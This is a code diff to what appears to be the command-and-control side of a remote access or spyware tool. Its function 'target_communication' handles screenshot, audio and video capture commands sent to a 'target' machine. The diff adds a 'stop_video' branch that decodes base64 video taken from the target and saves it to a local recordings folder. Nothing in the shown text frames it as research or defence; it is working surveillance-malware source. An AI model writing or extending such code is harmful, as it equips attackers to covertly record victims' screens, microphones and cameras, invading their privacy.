@@ -169,7 +169,7 @@ def target_communication():
                     print(f"Screenshot saved to: {filepath} ({result['size']} bytes)")
                 else:
                     print(f"Screenshot: {result}")
-            elif command in ['start_audio', 'start_video', 'start_recording']:
+            elif command in ['start_audio', 'start_video']:
                 print(f"Recording: {result}")
             elif command == 'stop_audio':
                 if isinstance(result, dict) and result.get('action') == 'audio':
@@ -187,6 +187,22 @@ def target_communication():
                     print(f"Audio saved to: {audio_path} ({result['size']} bytes)")
                 else:
                     print(f"Audio: {result}")
+            elif command == 'stop_video':
+                if isinstance(result, dict) and result.get('action') == 'video':
+                    # Save video file to server
+                    recordings_dir = "recordings"
+                    if not os.path.exists(recordings_dir):
+                        os.makedirs(recordings_dir)
+                    
+                    video_data = base64.b64decode(result['data'])
+                    video_path = os.path.join(recordings_dir, result['filename'])
+                    
+                    with open(video_path, 'wb') as f:
+                        f.write(video_data)
+                    
+                    print(f"Video saved to: {video_path} ({result['size']} bytes)")
+                else:
+                    print(f"Video: {result}")
             elif command == 'list_recordings':
                 # List recordings from server directory
                 recordings_dir = "recordings"
